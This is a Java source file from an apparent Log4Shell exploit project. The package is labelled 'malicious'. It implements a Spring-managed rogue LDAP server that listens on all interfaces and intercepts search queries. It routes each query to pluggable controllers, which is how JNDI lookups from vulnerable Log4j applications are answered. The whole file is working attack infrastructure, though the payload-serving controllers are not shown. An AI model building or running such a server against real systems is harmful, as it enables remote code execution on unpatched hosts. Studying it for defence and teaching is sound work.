package es.malvarez.log4shell.malicious.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import es.malvarez.log4shell.malicious.MaliciousProperties;
import lombok.RequiredArgsConstructor;
import lombok.extern.log4j.Log4j2;
import org.springframework.context.ApplicationContext;
import org.springframework.core.annotation.AnnotationUtils;
import org.springframework.stereotype.Component;

import javax.annotation.PostConstruct;
import javax.annotation.PreDestroy;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Map;
import java.util.TreeMap;
import java.util.stream.Collectors;

@Component
@Log4j2
@RequiredArgsConstructor
public class LdapServer extends InMemoryOperationInterceptor {

    private final MaliciousProperties properties;

    private final ApplicationContext context;

    private final Map<String, LdapController> routes = new TreeMap<>();

    private InMemoryDirectoryServer server;

    @PostConstruct
    public void start() {
        try {
            routes.putAll(createRoutes());
            server = createServer();
            server.startListening();
            log.info("Listening on port {} and routes {}", properties.getLdapPort(), routes.keySet());
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    @PreDestroy
    public void end() {
        server.shutDown(true);
    }

    private Map<String, LdapController> createRoutes() {
        return context.getBeansWithAnnotation(LdapRoute.class)
                .values()
                .stream()
                .collect(Collectors.toMap(this::getRoute,  LdapController.class::cast));
    }

    private String getRoute(final Object object) {
        LdapRoute route = AnnotationUtils.findAnnotation(object.getClass(), LdapRoute.class);
        return route.route();
    }

    private InMemoryDirectoryServer createServer() throws UnknownHostException, LDAPException {
        InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");
        serverConfig.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                properties.getLdapPort(),
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()));

        serverConfig.addInMemoryOperationInterceptor(this);
        return new InMemoryDirectoryServer(serverConfig);
    }

    @Override
    public void processSearchResult(final InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        log.info("Received query {}", base);
        try {
            LdapController controller = findController(base.toLowerCase());
            controller.process(result, base);
        } catch (Exception e) {
            log.info("Failed to process query {}", base, e);
            result.setResult(new LDAPResult(0, ResultCode.PARAM_ERROR));
        }
    }

    private LdapController findController(final String query) {
        return routes.entrySet().stream()
                .filter(entry -> query.startsWith(entry.getKey()))
                .findFirst()
                .map(Map.Entry::getValue)
                .orElseThrow(() -> new IllegalArgumentException("No route found for " + query));
    }
}
